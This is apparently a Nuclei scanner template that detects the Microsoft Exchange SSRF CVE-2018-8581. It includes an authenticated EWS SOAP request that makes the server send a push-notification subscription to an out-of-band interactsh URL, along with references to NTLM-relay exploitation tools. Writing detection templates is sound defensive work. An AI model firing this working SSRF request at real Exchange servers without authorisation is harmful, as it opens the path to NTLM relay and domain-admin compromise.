http/cves/2018/CVE-2018-8581.yaml

id: CVE-2018-8581

info:
  name: Microsoft Exchange Server SSRF (Elevation of Privilege)
  author: future
  severity: high
  description: |
    Microsoft Exchange Server contains an elevation of privilege caused by a vulnerability in the system, letting attackers escalate their privileges. The vulnerability exists in the way Exchange handle subscriptions to Push Notifications. An authenticated attacker can cause the Exchange server to send a subscription request to an arbitrary URL, potentially leading to NTLM relay attacks or other SSRF-related exploits.
  impact: |
    Successful exploitation could allow an attacker to escalate privileges to Domain Admin in certain configurations via NTLM relay.
  remediation: |
    Apply the security updates for Microsoft Exchange Server (August 2018 or later). Refer to Microsoft Security Advisory CVE-2018-8581 for details.
  reference:
    - https://vulncheck.com/xdb/276c34c7f74f
    - https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
    - https://github.com/Ridter/Exchange2domain
    - https://nvd.nist.gov/vuln/detail/CVE-2018-8581
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2018-8581
    cwe-id: CWE-918
  metadata:
    max-request: 1
    shodan-query: cpe:"cpe:2.3:a:microsoft:exchange_server"
    product: exchange_server
    vendor: microsoft
  tags: cve,cve2018,exchange,ssrf,oast,microsoft,kev

http:
  - raw:
      - |
        POST /ews/exchange.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Authorization: Basic {{base64(username + ":" + password)}}

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                       xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                       xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2010" />
          </soap:Header>
          <soap:Body>
            <m:Subscribe>
              <m:PushSubscriptionRequest>
                <t:FolderIds>
                  <t:DistinguishedFolderId Id="inbox" />
                </t:FolderIds>
                <t:EventTypes>
                  <t:EventType>NewMailEvent</t:EventType>
                </t:EventTypes>
                <t:StatusFrequency>1</t:StatusFrequency>
                <t:URL>http://{{interactsh-url}}</t:URL>
              </m:PushSubscriptionRequest>
            </m:Subscribe>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"

      - type: word
        part: body
        words:
          - "PushSubscriptionRequest"
          - "SubscribeResponse"
        condition: or

      - type: status
        status:
          - 200
